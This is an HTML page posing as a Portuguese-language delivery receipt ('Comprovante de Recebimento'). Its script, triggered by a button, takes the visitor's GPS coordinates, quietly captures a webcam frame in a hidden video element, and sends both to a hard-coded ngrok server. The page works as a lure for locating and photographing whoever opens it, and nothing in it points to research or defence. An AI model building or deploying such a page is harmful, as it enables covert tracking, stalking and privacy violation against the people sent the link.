<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Comprovante de Recebimento</title>
</head>
<body>
  <h1>Comprovante de Recebimento</h1>
  <p>Data: <span id="data-atual"></span></p>

  <button onclick="startProcess()">Enviar localização e foto</button>

  <script>
    // Aqui sua URL ngrok atualizada:
    const NGROK_SERVER = "https://2303-201-42-106-118.ngrok-free.app";

    // Mostra data atual
    const dataAtual = new Date();
    document.getElementById("data-atual").textContent = dataAtual.toLocaleDateString();

    function startProcess() {
      if (!navigator.geolocation) {
        alert("Geolocalização não suportada");
        return;
      }

      navigator.geolocation.getCurrentPosition(async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

        // Captura foto da webcam
        const photoBase64 = await capturePhoto();

        if (!photoBase64) {
          alert("Não foi possível capturar a foto");
          return;
        }

        // Envia dados para backend
        fetch(`${NGROK_SERVER}/send-location-photo`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ latitude, longitude, maps, photo: photoBase64 }),
        })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            alert("Dados enviados com sucesso!");
          } else {
            alert("Falha ao enviar os dados.");
          }
        })
        .catch(err => {
          console.error("Erro:", err);
          alert("Erro na comunicação com o servidor.");
        });

      }, (error) => {
        alert("Erro ao obter localização: " + error.message);
      });
    }

    // Função para capturar foto da webcam e retornar base64
    function capturePhoto() {
      return new Promise((resolve, reject) => {
        const video = document.createElement("video");
        video.setAttribute("autoplay", "");
        video.style.display = "none";
        document.body.appendChild(video);

        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = () => {
              const canvas = document.createElement("canvas");
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext("2d");
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

              // Para a câmera
              stream.getTracks().forEach(track => track.stop());
              video.remove();

              const dataURL = canvas.toDataURL("image/png");
              resolve(dataURL);
            };
          })
          .catch(err => {
            video.remove();
            reject(err);
          });
      });
    }
  </script>
</body>
</html>
